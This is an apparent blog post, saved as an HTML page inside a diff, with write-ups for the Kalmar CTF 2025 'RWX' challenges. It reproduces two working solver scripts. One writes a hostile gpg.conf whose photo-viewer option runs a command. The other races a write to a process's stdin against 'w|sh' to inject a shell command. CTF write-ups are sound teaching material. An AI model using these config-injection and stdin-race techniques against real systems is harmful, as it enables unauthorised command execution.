@@ -1,0 +1,786 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xciphand">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="A post that records wp. 0x00 IntroductionTBD Filesrwx-bronze.zip rwx-silver.zip rwx-gold.zip rwx-diamond.zip  0x01 RWX - BronzeWe give you file read, file write and code execution. But can you get the">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Misc] RWX [Kalmar CTF 2025]">
+<meta property="og:url" content="http://xciphand.github.io/2025/03/12/Misc-RWX-Kalmar-CTF-2025/index.html">
+<meta property="og:site_name" content="xciphand&#39;s Blog">
+<meta property="og:description" content="A post that records wp. 0x00 IntroductionTBD Filesrwx-bronze.zip rwx-silver.zip rwx-gold.zip rwx-diamond.zip  0x01 RWX - BronzeWe give you file read, file write and code execution. But can you get the">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-03-12T03:30:02.000Z">
+<meta property="article:modified_time" content="2025-03-12T03:49:16.492Z">
+<meta property="article:author" content="xciphand">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="wp">
+<meta property="article:tag" content="Kalmar">
+<meta property="article:tag" content="2025">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>[Misc] RWX [Kalmar CTF 2025] - xciphand&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xciphand.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":25,"cursorChar":"_","loop":false,"scope":["home","post"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":false,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xciphand&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="[Misc] RWX [Kalmar CTF 2025]"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-12 11:30" pubdate>
+          2025年3月12日 中午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          455 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          4 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">[Misc] RWX [Kalmar CTF 2025]</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>A post that records wp.</p>
+<h1 id="0x00-Introduction"><a href="#0x00-Introduction" class="headerlink" title="0x00 Introduction"></a>0x00 Introduction</h1><p>TBD</p>
+<h2 id="Files"><a href="#Files" class="headerlink" title="Files"></a>Files</h2><a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-bronze.zip">rwx-bronze.zip</a><br>
+<a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-silver.zip">rwx-silver.zip</a><br>
+<a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-gold.zip">rwx-gold.zip</a><br>
+<a href="/2025/03/12/Misc-RWX-Kalmar-CTF-2025/rwx-bronze.zip" title="rwx-diamond.zip">rwx-diamond.zip</a>
+
+<h1 id="0x01-RWX-Bronze"><a href="#0x01-RWX-Bronze" class="headerlink" title="0x01 RWX - Bronze"></a>0x01 RWX - Bronze</h1><p>We give you file read, file write and code execution. But can you get the flag? Let’s start out gently.</p>
+<p><a target="_blank" rel="noopener" href="https://mqcybersec.org/writeups/25-kalmar-rwxbronze/">writeup</a></p>
+<h1 id="0x02-RWX-Silver"><a href="#0x02-RWX-Silver" class="headerlink" title="0x02 RWX - Silver"></a>0x02 RWX - Silver</h1><p>We give you file read, file write and code execution. But can you get the flag? Apparently that was too much!</p>
+<p><a target="_blank" rel="noopener" href="https://mqcybersec.org/writeups/25-kalmar-rwxsilver/">writeup</a></p>
+<h1 id="0x03-RWX-Gold"><a href="#0x03-RWX-Gold" class="headerlink" title="0x03 RWX - Gold"></a>0x03 RWX - Gold</h1><p>We give you file read, file write and code execution. But can you get the flag? Let’s reduce that.</p>
+<p><a target="_blank" rel="noopener" href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348516577909149748">writeup</a></p>
+<p>Writeup script from <a target="_blank" rel="noopener" href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348516577909149748">discord</a> :</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#-*- coding: utf-8 -*-</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-comment"># baseuri = &#x27;http://127.0.0.1:6664&#x27;</span><br>baseuri = <span class="hljs-string">&#x27;https://e7670e20cc2473544d7f83208eac8ba3-42112.inst2.chal-kalmarc.tf&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rwx_read</span>(<span class="hljs-params">filename</span>):<br>    uri = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;baseuri&#125;</span>/read&#x27;</span><br>    uri_param = &#123;<span class="hljs-string">&quot;filename&quot;</span>: filename&#125;<br>    response = requests.get(uri, params=uri_param)<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rwx_write</span>(<span class="hljs-params">filename, content</span>):<br>    uri = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;baseuri&#125;</span>/write&#x27;</span><br>    uri_param = &#123;<span class="hljs-string">&#x27;filename&#x27;</span>: filename&#125;<br>    response = requests.post(uri, params=uri_param, data=content)<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rwx_exec</span>(<span class="hljs-params">cmd</span>):<br>    uri = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;baseuri&#125;</span>/exec&#x27;</span><br>    uri_param = &#123;<span class="hljs-string">&#x27;cmd&#x27;</span>: quote(cmd)&#125;<br>    response = requests.get(uri, params=uri_param)<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># Gold</span><br>    result = rwx_exec(<span class="hljs-string">&#x27;gpg&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    gpg_conf_content = (<br>        <span class="hljs-string">&#x27;list-options show-photos\n&#x27;</span><br>        <span class="hljs-string">&#x27;photo-viewer /would you be so kind to provide me with a flag &gt; /tmp/x\n&#x27;</span><br>        <span class="hljs-string">&#x27;list-keys\n&#x27;</span><br>    )<br>    result = rwx_write(<span class="hljs-string">&#x27;/home/user/.gnupg/gpg.conf&#x27;</span>, gpg_conf_content)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    <span class="hljs-comment"># pubring_kbx = Path.home()/&#x27;.gnupg&#x27;/&#x27;pubring.kbx&#x27;</span><br>    <span class="hljs-comment"># pubring_data = pubring_kbx.read_bytes()</span><br>    <span class="hljs-comment"># pubring_data = bytes([])</span><br>    pubring_data = b64decode(<span class="hljs-string">b&#x27;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&#x27;</span>)<br>    result = rwx_write(<span class="hljs-string">&#x27;/home/user/.gnupg/pubring.kbx&#x27;</span>, pubring_data)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    result = rwx_exec(<span class="hljs-string">&#x27;gpg&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(result)<br><br>    flag = rwx_read(<span class="hljs-string">&#x27;/tmp/x&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(flag)<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    <span class="hljs-comment"># kalmar&#123;so_many_rabbit_holes_to_get_stuck_in_but_luckily_you_found_a_way_to_view_that_picture_678cac2678d0&#125;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.exit(main())<br></code></pre></td></tr></table></figure>
+
+<h1 id="0x04-RWX-Diamond"><a href="#0x04-RWX-Diamond" class="headerlink" title="0x04 RWX - Diamond"></a>0x04 RWX - Diamond</h1><p>We give you file read, file write and code execution. But can you get the flag? Let’s increase it! But remove that!</p>
+<p><a target="_blank" rel="noopener" href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348392686763376711">writeup</a></p>
+<p>Writeup script form <a target="_blank" rel="noopener" href="https://discord.com/channels/1080522083991293952/1080526288042856448/1348392686763376711">discord</a></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs py">URL = <span class="hljs-string">&quot;http://localhost:6664&quot;</span><br>URL = <span class="hljs-string">&quot;https://ba7e4676f3127c778d22984e60fda234-50360.inst2.chal-kalmarc.tf&quot;</span><br>CMD = <span class="hljs-string">&quot;/would you be so kind to provide me with a flag&quot;</span><br><br><span class="hljs-keyword">import</span> requests, threading, time, re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun_fd</span>():<br>    <span class="hljs-keyword">global</span> pid<br>    requests.post(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/write?filename=/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/0&quot;</span>, data=CMD)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fun_cmd</span>():<br>    <span class="hljs-keyword">global</span> res<br>    res = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/exec&quot;</span>, params=&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;w|sh&quot;</span>&#125;).text<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.get(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;URL&#125;</span>/exec&quot;</span>, params=&#123;<span class="hljs-string">&quot;cmd&quot;</span>: <span class="hljs-string">&quot;ps&quot;</span>&#125;).text<br>    <span class="hljs-built_in">print</span>(r)<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> r.splitlines():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ps&quot;</span> <span class="hljs-keyword">in</span> l:<br>            pid = <span class="hljs-built_in">int</span>(l.split()[<span class="hljs-number">0</span>])<br>            <span class="hljs-keyword">break</span><br>    pid += <span class="hljs-number">4</span><br>    <span class="hljs-built_in">print</span>(pid)<br>    race_cmd = threading.Thread(target=fun_cmd)<br>    race_fd = threading.Thread(target=fun_fd)<br><br>    race_fd.start(); race_cmd.start()<br>    race_cmd.join(); race_fd.join()<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;kalmar&#123;&quot;</span> <span class="hljs-keyword">in</span> res: <span class="hljs-built_in">print</span>(res); <span class="hljs-keyword">break</span><br>    time.sleep(<span class="hljs-number">0.1</span>)<br><span class="hljs-comment"># kalmar&#123;that_was_much_harder_than_you_thought_at_first_but_we_must_finally_admit_defeat_baeb4335fa12&#125;</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctfwp/" class="category-chain-item">ctfwp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/" class="print-no-link">#ctf</a>
+      
+        <a href="/tags/wp/" class="print-no-link">#wp</a>
+      
+        <a href="/tags/Kalmar/" class="print-no-link">#Kalmar</a>
+      
+        <a href="/tags/2025/" class="print-no-link">#2025</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>[Misc] RWX [Kalmar CTF 2025]</div>
+      <div>http://xciphand.github.io/2025/03/12/Misc-RWX-Kalmar-CTF-2025/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>xciphand</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年3月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/12/LITCTF-2024/" title="LITCTF-2024">
+                        <span class="hidden-mobile">LITCTF-2024</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"xCipHanD/xCipHanD.github.io","repo-id":"R_kgDOKA_8sA","category":"Announcements","category-id":"DIC_kwDOKA_8sM4CcEcM","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
